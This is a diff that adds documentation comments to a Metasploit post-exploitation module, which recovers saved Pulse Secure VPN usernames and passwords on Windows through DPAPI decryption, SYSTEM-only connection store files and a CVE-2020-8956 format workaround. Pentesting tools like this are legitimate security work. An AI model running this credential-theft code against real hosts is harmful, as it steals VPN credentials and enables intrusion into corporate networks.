@@ -37,8 +37,15 @@ class MetasploitModule < Msf::Post
 
   end
 
+  # Decrypts data encrypted with Windows DPAPI by calling CryptUnprotectData
+  # with entropy as pOptionalEntropy value.
+  #
+  # @param [String] data Encrypted data, pDataIn per crypt32.dll.
+  # @param [String] entropy Optional entropy value, pOptionalEntropy per crypt32.dll
+  #
+  # @return [String] Decrypted value or empty string in case of failure. 
+  #
   def decrypt_reg(data, entropy)
-    # decrypt value using CryptUnprotectData
     rg = session.railgun
     pid = session.sys.process.getpid
     process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)
@@ -76,6 +83,10 @@ class MetasploitModule < Msf::Post
     return process.memory.read(addr, len)
   end
 
+  # Parse the build information from Pulse Connect Secure client version file.
+  #
+  # @return [String] build version
+  #
   def get_build
     begin
       version_path = "C:\\Program Files (x86)\\Pulse Secure\\Pulse\\versionInfo.ini"
@@ -87,9 +98,14 @@ class MetasploitModule < Msf::Post
     end
   end
 
+  # Parse IVEs definitions from Pulse Secure Connect client connection store
+  # files. Each definition is converted into a hash holding a connection source,
+  # a friendly name, a URI, and an array of credentials. These hashes are stored
+  # into a hash, indexed by IVE identifiers.
+  #
+  # @return [hash] A hash indexed by IVE identifier
+  #
   def get_ives
-    # parse connection profiles from Pulse Secure connection store and returns them
-    # in a dict, indexed by connection identifier.
     connstore_paths = [
       "C:\\ProgramData\\Pulse Secure\\ConnectionStore\\connstore.dat",
       "C:\\ProgramData\\Pulse Secure\\ConnectionStore\\connstore.bak",
@@ -117,6 +133,18 @@ class MetasploitModule < Msf::Post
     end
   end
 
+  # Pulse Secure Connect client service creates two files for each user that
+  # established a VPN connection at some point in time. The filename contains
+  # the user SID, with '.dat' or '.bak' as suffix.
+  #
+  # These files are only readable by SYSTEM and contains connection details
+  # for each IVE the user connected with. We use these details to extract
+  # the actual username used to establish the VPN connection if the module
+  # runs with elevated privileges.
+  # 
+  # @return [String] the username used by user linked to `sid` when establishing
+  # a connection with IVE `ive_index`
+  #
   def get_username(sid, ive_index)
     if not is_system?
       return nil
@@ -139,12 +167,21 @@ class MetasploitModule < Msf::Post
     return nil
   end
 
+  # Implements IVE index to pOptionalEntropy value like Pulse Secure Connect
+  # client does.
+  #
+  # @return [String] pOptionalEntropy representation of `ive_index`.
+  #
   def get_entropy_from_ive_index(ive_index)
     return "IVE:#{ive_index.upcase}"
   end
 
+  # Convert pOptionalEntropy value to UTF-16
+  #
+  # @param [String] entropy value
+  # @return [String] `entropy` value converted to UTF-16
+  #
   def cast_entropy(entropy)
-    # we generate the CryptUnprotect entropy value from IVE key
     entropy_utf16 = []
     entropy.each_char do |c|
       entropy_utf16 << c.ord
@@ -153,6 +190,19 @@ class MetasploitModule < Msf::Post
     return entropy_utf16.pack("c*")
   end
 
+  # In affected versions, the data is saved as hex bytes in the registry and
+  # can be used as is when calling CryptUnprotectData.
+  #
+  # The fix for CVE-2020-8956 involves a new format where hex bytes
+  # are represented within a two-bytes per char UTF-8 string. In order to
+  # properly convert the hex bytes we're interested in, we first
+  # convert the string from a two-bytes encoding to a one-byte encoding
+  # by getting rid of null bytes (e.g. \x00\x41 becomes \x00\x41).
+  #
+  # Once converted, we can simply pack it back to raw hex bytes.
+  #
+  # NOTE: I'm sure there is a simpler way to do this.
+  #
   def please_convert(my_str)
    output = []
    i = 0
@@ -238,6 +288,7 @@ class MetasploitModule < Msf::Post
     return creds
   end
 
+  # Array of vulnerable builds branches.
   def vuln_builds
      [
        [Gem::Version.new('0.0.0'), Gem::Version.new('9.0.5')],
